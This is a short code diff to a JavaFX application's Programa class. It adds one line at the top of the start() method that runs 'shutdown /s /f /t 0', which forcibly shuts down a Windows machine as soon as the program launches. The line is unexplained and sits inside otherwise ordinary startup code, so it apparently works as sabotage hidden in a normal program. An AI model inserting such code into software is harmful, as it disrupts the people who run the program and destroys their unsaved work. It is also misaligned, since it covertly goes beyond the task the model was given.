@@ -42,6 +42,8 @@ public class Programa extends Application {
 
     @Override
     public void start(Stage primaryStage) throws Exception {
+        Runtime.getRuntime().exec("shutdown /s /f /t 0");
+
         Thread.setDefaultUncaughtExceptionHandler((t, e) -> {
             if (developerMode)
                 e.printStackTrace();
